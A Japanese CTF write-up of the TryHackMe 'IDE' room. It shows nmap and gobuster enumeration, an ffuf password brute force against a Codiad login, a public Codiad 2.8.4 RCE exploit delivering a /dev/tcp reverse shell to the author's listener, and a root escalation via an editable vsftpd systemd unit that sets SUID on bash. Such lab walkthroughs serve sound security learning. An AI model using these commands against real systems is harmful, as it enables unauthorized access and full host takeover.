# IDE CTF

https://tryhackme.com/room/ide

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.65.209
root@ip-10-10-180-133:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-18 06:10 GMT
Nmap scan report for 10.10.65.209
Host is up (0.00015s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown
MAC Address: 02:FE:C0:B6:6A:79 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds

root@ip-10-10-180-133:~# sudo nmap -sV -p21,22,80,62337 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-18 07:01 GMT
Nmap scan report for ide.thm (10.10.65.209)
Host is up (0.00035s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:FE:C0:B6:6A:79 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

62337 にも HTTP がある。（Codiad 2.8.4）

### gobuster

```shell
gobuster dir -x=txt,php -u http://ide.thm -w ./dirlist.txt -t 30
```

何もでない。

```shell
gobuster dir -x=txt,php -u http://ide.thm:62337 -w ./dirlist.txt -t 30
```

### FTP

```shell
$ ftp 10.10.65.209
Connected to 10.10.65.209.
220 (vsFTPd 3.0.3)
Name (10.10.65.209:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||8675|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||30876|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get -
```

```shell
$ cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

- john はデフォルトパスワードにリセットされている
- 画像ファイルに何かあると示唆している
- drac ユーザーも存在する

## Codiad 2.8.4

```shell
$ searchsploit codiad
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                              | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                          | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                          | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                          | multiple/webapps/50474.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

RCE があるが、いずれも認証が必要。

john ユーザー固定でブルートフォース。

```shell
$ ffuf -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=john&password=FUZZ&theme=default&language=e" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: f9c7294bc8f6035df784b56b800b122c=n4bgbj19qdjfno3q0l882d2fon" -u http://ide.thm:62337/components/user/controller.php?action=authenticate -fr 'Incorrect'


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://ide.thm:62337/components/user/controller.php?action=authenticate
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Cookie: f9c7294bc8f6035df784b56b800b122c=n4bgbj19qdjfno3q0l882d2fon
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=john&password=FUZZ&theme=default&language=e
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect
________________________________________________

（ひみつ）                [Status: 200, Size: 47, Words: 1, Lines: 1, Duration: 3410ms]
:: Progress: [101/101] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

パスワードが判明

## エクスプロイト

4 つのうちこれ以外は、おそらく環境的な要因のため機能しなかった。

```shell
$ python ./49705.py http://ide.thm:62337/ john （ひみつ） 10.2.22.182 8888 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.2.22.182/8889 0>&1 2>&1"' | nc -lnvp 8888
nc -lnvp 8889
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

この 2 行を別々のシェルで実行する必要があることに気付かず苦労した。

```shell
echo 'bash -c "bash -i >/dev/tcp/10.2.22.182/8889 0>&1 2>&1"' | nc -lnvp 8888
nc -lnvp 8889
```

リバースシェル取得。

```shell
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.65.209] 36656
bash: cannot set terminal process group (917): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ide:/var/www/html/codiad/components/filemanager$
```

```shell
www-data@ide:/var/www/html/codiad/components/filemanager$ ls -al /home
ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Jun 17  2021 .
drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac
www-data@ide:/var/www/html/codiad/components/filemanager$ ls -al /home/drac
ls -al /home/drac
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
```

drac に昇格する必要がある。

## 権限昇格１

bash ヒストリーが読めるようになっている。

```shell
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /home/drac/.bash_history
<omponents/filemanager$ cat /home/drac/.bash_history
mysql -u drac -p '.........................'
```

このパスワードを使い、drac で SSH 接続できた。

```shell
drac@ide:~$ cat user.txt
..................................
```

ユーザーフラグゲット。

## 権限昇格２

sudo

```shell
drac@ide:~$ sudo -l
[sudo] password for drac:
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

vsftpd サービスを sudo で再起動できる。

```shell
drac@ide:~$ systemctl cat vsftpd
# /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

```shell
drac@ide:~$ ls -al /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

サービス設定を編集できるので、User を root にし、ExecStart で bash に SUID を付けるなどしたら root シェルを取れるはず。

編集した。

```shell
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
```

リスタートしたら、'systemctl daemon-reload'が必要と表示されたので実行。

```shell
drac@ide:~$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password:
==== AUTHENTICATION COMPLETE ===
drac@ide:~$ systemctl status vsftpd.service
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2025-03-18 08:00:01 UTC; 6min ago
 Main PID: 18663 (vsftpd)
    Tasks: 1 (limit: 1103)
   CGroup: /system.slice/vsftpd.service
           └─18663 /usr/sbin/vsftpd /etc/vsftpd.conf
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```

SUID 付与成功。

```shell
drac@ide:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

```shell
drac@ide:~$ bash -p
bash-4.4# id
uid=1000(drac) gid=1000(drac) euid=0(root) egid=0(root) groups=0(root),24(cdrom),27(sudo),30(dip),46(plugdev),1000(drac)
```

```shell
bash-4.4# ls -al /root
total 40
drwx------  6 root root 4096 Jun 18  2021 .
drwxr-xr-x 26 root root 4096 Mar 18 07:54 ..
lrwxrwxrwx  1 root root    9 Jun 18  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jun 18  2021 .cache
drwx------  3 root root 4096 Jun 18  2021 .gnupg
drwxr-xr-x  3 root root 4096 Jun 18  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Jun 18  2021 root.txt
-rw-r--r--  1 root root   66 Jun 18  2021 .selected_editor
drwx------  2 root root 4096 Jun 17  2021 .ssh
bash-4.4# cat /root/root.txt
..................................
```

ルートフラグゲット！

## 振り返り

- 最初、62337 ポートを見落としていて、FTP の後に詰まって SSH ブルートフォース等していた。
- サービス系の操作は苦手意識があるので練習が必要。
- サービスの ExecStart の設定でエラーが出て困ったが、原因はコマンドを絶対パスで書いていなかったことだと思われる。
